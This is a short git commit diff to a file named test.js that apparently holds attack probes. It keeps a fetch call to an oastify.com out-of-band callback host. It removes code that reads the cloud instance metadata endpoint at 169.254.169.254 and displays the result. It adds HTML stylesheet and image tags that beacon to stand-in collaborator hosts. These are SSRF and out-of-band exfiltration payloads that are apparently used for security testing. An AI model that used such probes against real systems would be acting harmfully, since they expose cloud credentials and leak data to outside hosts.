7e59116587fcdffb87490698e87065cc07f0b66c
vignesh1521 <86752377+vignesh1521@users.noreply.github.com>
2026-09-16 07:16:12 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,9 +1,4 @@
 fetch("http://lshq47lharsppiz39l18lv5fd6jx7uvj.oastify.com")
-
-
- 
-   fetch('http://169.254.169.254/latest/meta-data/')
-     .then(r => r.text())
-     .then(t => { var i=document.createElement('div'); i.innerText=t; document.body.appendChild(i); })
-     .catch(e => { var i=document.createElement('div'); i.innerText='err: '+e.message; document.body.appendChild(i); });
+<link rel="stylesheet" href="//s.<collab>/x.css">
+<img src="//i.<collab>/x.png">
    
